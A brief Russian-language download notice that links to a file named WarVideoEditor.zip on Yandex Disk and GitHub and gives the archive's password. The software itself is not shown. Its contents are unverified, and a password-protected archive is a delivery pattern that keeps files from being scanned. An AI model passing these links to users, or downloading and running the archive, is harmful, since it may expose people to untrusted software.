Скачать с Яндекс.Диска: https://disk.yandex.ru/d/Hq2rw5EBWuxHCA

Скачать с GitHub: https://github.com/WarGack/WarVideoEditor/blob/main/WarVideoEditor.zip
Пароль на архив: warnight.net
